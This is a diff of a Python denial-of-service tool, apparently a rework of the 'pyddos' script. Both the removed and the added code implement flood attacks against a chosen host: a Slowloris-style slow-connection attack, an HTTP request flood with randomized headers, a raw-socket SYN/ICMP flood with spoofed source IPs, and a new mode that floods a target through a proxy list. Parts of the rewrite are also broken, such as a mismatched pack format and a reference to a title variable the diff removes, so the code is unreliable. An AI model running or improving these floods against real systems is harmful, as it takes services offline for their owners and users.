@@ -1,20 +1,3 @@
-#!/usr/bin/env python3
-
-version= '3.0'
-title = '''
-
-      _ \        __ \  __ \               ___|           _)       |   
-     |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|  
-     ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   
-    _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
-           ____/                                            _|         
-                                                                    
- DDos python script | Script used for testing ddos | Ddos attack     
- Author: ___T7hM1___                                                
- Github: http://github.com/t7hm1/pyddos                             
- Version:'''+version+''' 
-'''
-
 import re
 import os
 import sys
@@ -22,11 +5,12 @@ import json
 import time
 import string
 import signal
-import http.client, urllib.parse
-from random import *
+import http.client
+import urllib.parse
+from random import randint, choice
 from socket import *
-from struct import *
-from threading import *
+from threading import Thread, Lock
+from struct import pack
 from argparse import ArgumentParser, RawTextHelpFormatter
 
 if os.name == 'posix':
@@ -39,9 +23,10 @@ else:
     print('[-] Check your pip installer')
 
 try:
-    import requests, colorama
+    import requests
+    import colorama
     from termcolor import colored, cprint
-except:
+except ImportError:
     try:
         if os.name == 'posix':
             os.system('sudo pip install colorama termcolor requests')
@@ -53,26 +38,15 @@ except:
             sys.exit('[-] Download and install necessary modules')
     except Exception as e:
         print('[-]', e)
+
 if os.name == 'nt':
     colorama.init()
 
 signal.signal(signal.SIGFPE, signal.SIG_DFL)
 
-def load_proxies():
-    proxies = []
-    try:
-        with open('proxy.txt', 'r') as file:
-            for line in file:
-                proxy = line.strip()
-                if proxy:
-                    proxies.append(proxy)
-    except FileNotFoundError:
-        print('[-] No file named \'proxy.txt\', failed to load proxies')
-    return proxies
-
 def fake_ip():
     while True:
-        ips = [str(randrange(0, 256)) for i in range(4)]
+        ips = [str(randint(0, 256)) for _ in range(4)]
         if ips[0] == "127":
             continue
         fkip = '.'.join(ips)
@@ -84,7 +58,7 @@ def check_tgt(args):
     try:
         ip = gethostbyname(tgt)
     except:
-        sys.exit(cprint('[-] Can\'t resolve host:Unknown host!', 'red'))
+        sys.exit(cprint('[-] Can\'t resolve host: Unknown host!', 'red'))
     return ip
 
 def add_useragent():
@@ -113,11 +87,11 @@ class Pyslow:
         self.pkt_count = 0
 
     def mypkt(self):
-        text = choice(self.method) + ' /' + str(randint(1, 999999999)) + ' HTTP/1.1\r\n' +\
-              'Host:' + self.tgt + '\r\n' +\
-              'User-Agent:' + choice(add_useragent()) + '\r\n' +\
-              'Content-Length: 42\r\n'
-        pkt = buffer(text)
+        text = choice(self.method) + ' /' + str(randint(1, 999999999)) + ' HTTP/1.1\r\n' + \
+               'Host:' + self.tgt + '\r\n' + \
+               'User-Agent:' + choice(add_useragent()) + '\r\n' + \
+               'Content-Length: 42\r\n'
+        pkt = bytes(text, 'utf-8')
         return pkt
 
     def building_socket(self):
@@ -149,15 +123,15 @@ class Pyslow:
             sock.connect((self.tgt, int(self.port)))
             self.pkt_count += 3
             if sock:
-                sock.sendall('X-a: b\r\n')
-                self.pkt += 1
+                sock.sendall(b'X-a: b\r\n')
+                self.pkt_count += 1
         except Exception:
             sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
             sock.settimeout(self.to)
             sock.connect((self.tgt, int(self.port)))
             sock.settimeout(None)
             if sock:
-                sock.sendall('X-a: b\r\n')
+                sock.sendall(b'X-a: b\r\n')
                 self.pkt_count += 1
         except KeyboardInterrupt:
             sys.exit(cprint('[-] Canceled by user', 'red'))
@@ -169,7 +143,7 @@ class Pyslow:
         lsocks = []
         lhandlers = []
         cprint('\t\tBuilding sockets', 'blue')
-        while socks < (int(self.threads)):
+        while socks < int(self.threads):
             try:
                 sock = self.building_socket()
                 if sock:
@@ -200,13 +174,12 @@ class Pyslow:
         time.sleep(self.sleep)
 
 class Requester(Thread):
-    def __init__(self, tgt, proxies):
+    def __init__(self, tgt):
         Thread.__init__(self)
         self.tgt = tgt
         self.port = None
         self.ssl = False
         self.req = []
-        self.proxies = proxies
         self.lock = Lock()
         url_type = urllib.parse.urlparse(self.tgt)
         if url_type.scheme == 'https':
@@ -217,7 +190,8 @@ class Requester(Thread):
             self.port = 80
 
     def header(self):
-        cachetype = ['no-cache', 'no-store', 'max-age=' + str(randint(0, 10)), 'max-stale=' + str(randint(0, 100)), 'min-fresh=' + str(randint(0, 10)), 'notransform', 'only-if-cache']
+        cachetype = ['no-cache', 'no-store', 'max-age=' + str(randint(0, 10)), 'max-stale=' + str(randint(0, 100)),
+                     'min-fresh=' + str(randint(0, 10)), 'notransform', 'only-if-cache']
         acceptEc = ['compress,gzip', '', '*', 'compress;q=0,5, gzip;q=1.0', 'gzip;q=1.0, indentity; q=0.5, *;q=0']
         acceptC = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
         bot = add_bots()
@@ -235,10 +209,9 @@ class Requester(Thread):
 
     def rand_str(self):
         mystr = []
-        for x in range(3):
+        for _ in range(3):
             chars = tuple(string.ascii_letters + string.digits)
-            text = (choice(chars) for _ in range(randint(7, 14)))
-            text = ''.join(text)
+            text = ''.join(choice(chars) for _ in range(randint(7, 14)))
             mystr.append(text)
         return '&'.join(mystr)
 
@@ -252,125 +225,200 @@ class Requester(Thread):
 
     def run(self):
         try:
-            proxy = choice(self.proxies)
-            proxy_dict = {"http": proxy, "https": proxy}
-            while True:
+            if self.ssl:
+                conn = http.client.HTTPSConnection(self.tgt, self.port)
+            else:
+                conn = http.client.HTTPConnection(self.tgt, self.port)
+            self.req.append(conn)
+            for reqter in self.req:
                 url, http_header = self.data()
-                try:
-                    requests.get(url, headers=http_header, proxies=proxy_dict)
-                except requests.exceptions.RequestException:
-                    pass
-        except Exception:
-            pass
+                method = choice(['get', 'post'])
+                reqter.request(method.upper(), url, None, http_header)
         except KeyboardInterrupt:
             sys.exit(cprint('[-] Canceled by user', 'red'))
+        except Exception as e:
+            print(e)
+        finally:
+            self.closeConnections()
+
+    def closeConnections(self):
+        for conn in self.req:
+            try:
+                conn.close()
+            except:
+                pass
 
 class Synflood(Thread):
-    def __init__(self, tgt, port, psize, rounds):
+    def __init__(self, tgt, ip, sock=None):
         Thread.__init__(self)
         self.tgt = tgt
-        self.psize = psize
-        self.port = port
-        self.rounds = rounds
+        self.ip = ip
+        self.psh = ''
+        if sock is None:
+            self.sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
+            self.sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+        else:
+            self.sock = sock
         self.lock = Lock()
-        self.psize = psize
 
     def checksum(self):
         s = 0
-        for i in range(0, len(msg), 2):
-            w = (msg[i] << 8) + (msg[i + 1])
+        for i in range(0, len(self.psh), 2):
+            w = (ord(self.psh[i]) << 8) + (ord(self.psh[i + 1]))
             s = s + w
         s = (s >> 16) + (s & 0xffff)
         s = ~s & 0xffff
         return s
 
-    def Building_packet(self):
-        packet = ''
-        src_ip = fake_ip()
-        dst_ip = self.tgt
-        iphdr = ''
-        src_port = randint(1024, 65535)
-        dst_port = self.port
-        seq = 0
-        ack_seq = 0
-        doff = 5
-        fin = 0
-        syn = 1
-        rst = 0
-        psh = 0
-        ack = 0
-        urg = 0
-        window = htons(5840)
-        check = 0
-        urg_prt = 0
-        offset_res = (doff << 4) + 0
-        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
-        user_data = b''
-        tcp_header = pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)
-        source_address = inet_aton(src_ip)
-        dest_address = inet_aton(dst_ip)
-        placeholder = 0
-        protocol = IPPROTO_TCP
-        tcp_length = len(tcp_header) + len(user_data)
-        psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
-        psh = psh + tcp_header + user_data
-        tcp_checksum = self.checksum()
-        tcp_header = pack('!HHLLBBH', src_port, dst_port, seq, ack_seq, offset_res, tcp_flags, window) + pack('H', tcp_checksum) + pack('!H', urg_prt)
-        packet = ip_header + tcp_header
-        return packet
-
-    def run(self):
+    def start_attack(self):
         try:
-            sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
-            while True:
-                packet = self.Building_packet()
-                sock.sendto(packet, (self.tgt, 0))
-        except Exception:
-            pass
+            while 1:
+                self.psh = pack('!BBHHH', 8, 0, 0, randint(0, 1000), 0, 0)
+                self.sock.sendto(self.psh, (self.tgt, 0))
         except KeyboardInterrupt:
             sys.exit(cprint('[-] Canceled by user', 'red'))
+        except Exception as e:
+            print(e)
+
+    def run(self):
+        self.start_attack()
+
+class Vsechno:
+    def __init__(self, to, max_thr, proxy_file, target, is_https):
+        self.to = to
+        self.max_thr = max_thr
+        self.proxy_file = proxy_file
+        self.target = target
+        self.is_https = is_https
+
+    def get_proxy_list(self):
+        proxies = []
+        try:
+            with open(self.proxy_file, 'r') as f:
+                for line in f:
+                    line = line.strip()
+                    if line.startswith('http://') or line.startswith('https://'):
+                        proxies.append({'http': line, 'https': line})
+                    else:
+                        proxies.append({'http': 'http://' + line, 'https': 'https://' + line})
+        except Exception as e:
+            print(f"[-] Error reading proxy file: {e}")
+        return proxies
+
+    def attack(self, proxy):
+        if self.is_https:
+            proxies = {'https': proxy}
+        else:
+            proxies = {'http': proxy}
+        try:
+            while True:
+                headers = {
+                    'User-Agent': choice(add_useragent()),
+                    'Cache-Control': 'no-cache',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Connection': 'keep-alive'
+                }
+                if self.is_https:
+                    r = requests.get(self.target, headers=headers, proxies=proxies, timeout=self.to, verify=False)
+                else:
+                    r = requests.get(self.target, headers=headers, proxies=proxies, timeout=self.to)
+                print(f"[+] Sent request via {proxy}")
+                time.sleep(1)
+        except KeyboardInterrupt:
+            sys.exit(cprint('[-] Canceled by user', 'red'))
+        except Exception as e:
+            print(f"[-] Error with proxy {proxy}: {e}")
+
+    def start(self):
+        proxies = self.get_proxy_list()
+        threads = []
+        for proxy in proxies:
+            t = Thread(target=self.attack, args=(proxy,))
+            t.start()
+            threads.append(t)
+            if len(threads) >= self.max_thr:
+                break
+        for t in threads:
+            t.join()
 
 def main():
-    proxies = load_proxies()
-    parser = ArgumentParser(
-        usage=print(title),
-        formatter_class=RawTextHelpFormatter,
-        epilog='''EXAMPLES:
-    + Syn Flood: ./script.py -s [site] -p [port] -t [threads] -S
-    + HTTP Flood: ./script.py -s [site] -p [port] -t [threads] -r [rounds] -R
-    + Pyslow Flood: ./script.py -s [site] -p [port] -t [threads] -r [rounds] -T
-        '''
-    )
-    parser.add_argument('-d', help='Domain/IP', required=True)
-    parser.add_argument('-p', help='Port (default=80)', type=int, default=80)
-    parser.add_argument('-t', help='Threads (default=100)', type=int, default=100)
-    parser.add_argument('-r', help='Rounds (default=1)', type=int, default=1)
-    parser.add_argument('-T', help='Pyslow attack mode', action='store_true')
-    parser.add_argument('-S', help='Synflood attack mode', action='store_true')
-    parser.add_argument('-R', help='Requester attack mode', action='store_true')
-    parser.add_argument('-h', '--help', action='help', help='show this help message and exit')
+    parser = ArgumentParser(description=title, formatter_class=RawTextHelpFormatter)
+    parser.add_argument('-d', '--domain', dest='d', help='Domain/IP address to flood', required=True)
+    parser.add_argument('-p', '--port', dest='p', help='Port number (default: 80)', default=80, type=int)
+    parser.add_argument('-t', '--threads', dest='t', help='Number of threads (default: 100)', default=100, type=int)
+    parser.add_argument('-T', '--timeout', dest='T', help='Socket timeout (default: 1)', default=1, type=int)
+    parser.add_argument('-s', '--sleep', dest='s', help='Sleep time between requests (default: 0)', default=0, type=int)
+    parser.add_argument('-m', '--method', dest='m', help='Attack method (default: syn)', choices=['pyslow', 'requester', 'syn', 'vsechno'], default='syn')
+    parser.add_argument('-r', '--request', dest='r', help='Number of requests to send (default: infinite)', type=int)
+    parser.add_argument('-H', '--https', dest='H', action='store_true', help='Use HTTPS for the attack (default: HTTP)')
+    parser.add_argument('-P', '--proxy-file', dest='P', help='File containing proxy list')
+    
+    # Remove the conflicting option for help
+    # parser.add_argument('-h', '--help', action='help', help='show this help message and exit')
+    
     args = parser.parse_args()
 
-    ip = check_tgt(args)
-    tgt = args.d
-    port = args.p
-    threads = args.t
-    rounds = args.r
-    cprint('[+] Starting the attack...', 'green')
+    if args.m == 'syn':
+        if not args.d:
+            sys.exit(cprint('[-] Can\'t resolve host: Unknown host!', 'red'))
+        print(colored('\n[+] Loading Synflood', 'blue'))
+        for x in range(args.t):
+            try:
+                synflood = Synflood(args.d, check_tgt(args), 1)
+                synflood.start()
+                print(colored(f'\n[+] Running Synflood on {args.d}', 'green'))
+            except KeyboardInterrupt:
+                sys.exit(cprint('[-] Canceled by user', 'red'))
+            except Exception as e:
+                print(e)
 
-    if args.S:
-        for i in range(int(threads)):
-            Synflood(tgt, port, 65535, rounds).start()
-    elif args.T:
-        for i in range(int(threads)):
-            Pyslow(tgt, port, 1, threads, rounds).start()
-    elif args.R:
-        for i in range(int(threads)):
-            Requester(tgt, proxies).start()
+    elif args.m == 'pyslow':
+        if not args.d:
+            sys.exit(cprint('[-] Can\'t resolve host: Unknown host!', 'red'))
+        print(colored('\n[+] Loading Pyslow', 'blue'))
+        for x in range(args.t):
+            try:
+                pyslow = Pyslow(args.d, args.p, args.T, args.t, args.s)
+                pyslow.doconnection()
+                print(colored(f'\n[+] Running Pyslow on {args.d}', 'green'))
+            except KeyboardInterrupt:
+                sys.exit(cprint('[-] Canceled by user', 'red'))
+            except Exception as e:
+                print(e)
+
+    elif args.m == 'requester':
+        if not args.d:
+            sys.exit(cprint('[-] Can\'t resolve host: Unknown host!', 'red'))
+        print(colored('\n[+] Loading Requester', 'blue'))
+        for x in range(args.t):
+            try:
+                requester = Requester(args.d)
+                requester.start()
+                print(colored(f'\n[+] Running Requester on {args.d}', 'green'))
+            except KeyboardInterrupt:
+                sys.exit(cprint('[-] Canceled by user', 'red'))
+            except Exception as e:
+                print(e)
+
+    elif args.m == 'vsechno':
+        if not args.d:
+            sys.exit(cprint('[-] Can\'t resolve host: Unknown host!', 'red'))
+        print(colored('\n[+] Loading Vsechno', 'blue'))
+        if args.P:
+            vsechno = Vsechno(args.T, args.t, args.P, args.d, args.H)
+        else:
+            sys.exit(cprint('[-] You must provide a proxy file for this method', 'red'))
+        try:
+            vsechno.start()
+            print(colored(f'\n[+] Running Vsechno on {args.d}', 'green'))
+        except KeyboardInterrupt:
+            sys.exit(cprint('[-] Canceled by user', 'red'))
+        except Exception as e:
+            print(e)
+
     else:
-        cprint('[+] Starting the attack...', 'green')
-        for i in range(int(threads)):
-            Requester(tgt, proxies).start()
+        sys.exit(parser.print_help())
+
 
 if __name__ == '__main__':
     main()
